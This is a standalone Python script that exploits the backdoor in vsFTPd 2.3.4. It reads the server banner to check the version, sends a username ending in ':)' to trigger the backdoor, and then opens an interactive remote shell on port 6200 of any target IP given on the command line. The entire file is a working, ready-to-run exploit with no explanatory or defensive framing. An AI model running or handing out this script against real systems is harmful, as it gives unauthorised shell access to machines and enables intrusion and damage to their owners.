import socket
import sys
import time

def trigger_backdoor(ip, port=21):
    print(f"[*] Checking FTP Version on {ip}:{port}")
    try:
        with socket.create_connection((ip, port), timeout=10) as sock:
            banner = sock.recv(1024).decode()
            version = banner.split("vsFTPd ")[1].split(")")[0]
            
            if version != "2.3.4":
                print(f"[!] Target version {version} is not vulnerable. Exploit requires vsFTPd 2.3.4.")
                return False
            else:
                print("[+] Target is running vsFTPd 2.3.4. Proceeding with backdoor exploit...")
                sock.sendall(b"USER everythingBlackkk:)\r\n")
                sock.recv(1024)  # Receive response
                sock.sendall(b"PASS fsociety\r\n")
                return True
    except Exception as e:
        print(f"[!] Error during FTP connection: {e}")
        return False

def get_shell(ip):
    print(f"[*] Connecting to backdoor on {ip}:6200...")
    time.sleep(1)
    
    try:
        with socket.create_connection((ip, 6200), timeout=10) as sock:
            print("[+] Connection successful! You now have shell access.")
            while True:
                command = input("$ ").strip()
                if command.lower() in ['exit', 'quit']:
                    break
                sock.sendall(f"{command}\n".encode())
                response = sock.recv(4096).decode()
                print(response, end='')
    except Exception as e:
        print(f"[!] Failed to connect to backdoor: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3 or sys.argv[1] != "-host":
        print("Usage: python3 script.py -host <target_ip> [port]")
        sys.exit(1)

    target_ip = sys.argv[2]
    target_port = int(sys.argv[3]) if len(sys.argv) > 3 else 21

    print("[*] Initiating FTP backdoor exploit...")
    if trigger_backdoor(target_ip, target_port):
        get_shell(target_ip)
